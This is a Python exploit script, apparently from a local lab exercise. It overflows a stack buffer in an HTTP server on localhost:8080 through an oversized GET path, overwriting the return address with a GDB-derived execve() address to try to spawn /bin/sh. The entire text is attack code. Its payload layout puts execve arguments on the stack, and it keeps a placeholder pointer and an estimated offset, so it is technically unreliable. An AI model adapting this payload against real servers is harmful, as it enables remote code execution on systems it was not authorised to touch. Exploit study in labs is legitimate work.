#!/usr/bin/env python3
import socket
import struct

host = "localhost"
port = 8080

# Address of execve() from GDB
execve_addr = struct.pack("<Q", 0x7ffff7e7f310)
null = struct.pack("<Q", 0x0)

# Step 1: Start request path with "/bin/sh" string
binsh = b"/bin/sh\x00"

# Step 2: Fill the buffer after the string until we reach the return address
offset_to_rip = 4120  # estimate — fine-tune in GDB if needed
padding = b"A" * (offset_to_rip - len(binsh))

# Step 3: Build the payload
payload = binsh + padding
payload += execve_addr       # RIP overwrite
payload += null              # return address after execve
payload += b"B" * 8          # placeholder → will replace with actual binsh pointer
payload += null              # argv
payload += null              # envp

# Build final request
request = b"GET /" + payload + b" HTTP/1.0\r\n\r\n"

# Send it
s = socket.create_connection((host, port))
s.send(request)
s.close()
